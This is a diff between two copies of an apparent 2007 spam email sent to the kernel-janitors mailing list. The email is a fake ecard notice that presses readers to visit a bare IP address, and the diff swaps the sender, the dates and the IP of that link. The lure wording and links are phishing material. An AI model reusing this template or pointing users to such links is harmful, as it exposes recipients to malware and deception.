@@ -1,8 +1,10 @@
-From: "postcard.com" <lnbvy@ca.mbe.com>
-Date: Wed, 11 Jul 2007 12:12:53 +0000
+From: "postcard.com" <lnbvy@cdc.ru>
+Date: Mon, 16 Jul 2007 01:57:48 +0000
 Subject: [KJ] You've received an ecard from a Worshipper!
-Message-Id: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
+Message-Id: <002301c7c74c$b5862da0$c82c3432@wezp.cy>
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
+In-Reply-To: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -16,7 +18,7 @@ SEEING YOUR CARD
 If your email software creates links to Web pages, click on your 
 card's direct www address below while you are connected to the Internet:
 
-http://67.175.236.82/?ee713076a3db573383e1a7a859
+http://213.93.193.158/?ee713076a3db573383e1a7a859
 
 Or copy and paste it into your browser's "Location" box (where Internet 
 addresses go).
